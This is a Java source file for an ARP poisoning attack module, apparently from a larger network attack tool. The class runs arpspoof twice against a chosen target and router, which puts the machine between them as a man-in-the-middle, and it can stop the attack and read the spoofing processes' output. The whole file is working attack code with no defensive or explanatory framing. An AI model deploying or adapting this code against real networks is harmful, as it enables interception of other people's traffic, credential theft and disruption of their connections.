import java.io.*;

public class CARPPoisoningAttack implements IAttack
{

	private String m_strRouter = "";
	private String m_strTarget = "";
	private String m_strInterface = "";
	private CProcess m_prcSpoofRouter = null;
	private CProcess m_prcSpoofTarget = null;
	
	public void SetRouter(String strRouter)
	{
		m_strRouter = strRouter;
	}
	
	
	public void SetTarget(String strTarget)
	{
		m_strTarget = strTarget;
	}
	
	public void SetInterface(String strInterface)
	{
		m_strInterface = strInterface;
	}
	
	@Override
	public void Attack()
	{
		try
		{
			if (m_prcSpoofRouter != null && m_prcSpoofTarget != null)
				return;
			String astrSpoofTheRouter[] = new String[] {"arpspoof", "-i", m_strInterface, m_strTarget, m_strRouter};
			String astrSpoofTheTarget[] = new String[] {"arpspoof", "-i", m_strInterface, m_strRouter, m_strTarget};
			
			m_prcSpoofRouter = new CProcess(astrSpoofTheRouter, true, false, true);
			m_prcSpoofTarget = new CProcess(astrSpoofTheTarget, true, false, true);
			
		}
		catch (Exception excError)
		{
			CUtilities.WriteLog(excError);
		}
	}
	
	
	public void StopAttack()
	{
		try
		{
			if ( m_prcSpoofRouter != null )
			{
				m_prcSpoofRouter.CloseProcess();
				m_prcSpoofRouter = null;
			}
			if ( m_prcSpoofTarget != null )
			{
				m_prcSpoofTarget.CloseProcess();
				m_prcSpoofTarget = null;
			}
		}
		catch (Exception excError)
		{
			CUtilities.WriteLog(excError);
		}
	}
	
	public BufferedReader GetProcessOutputBuffer(String strProcessType)
	{
		if (strProcessType.equals("router"))
			return new BufferedReader(m_prcSpoofRouter.GetOutput());
		else if (strProcessType.equals("target"))
			return new BufferedReader(m_prcSpoofTarget.GetOutput());
		else
			return null;
	}

}
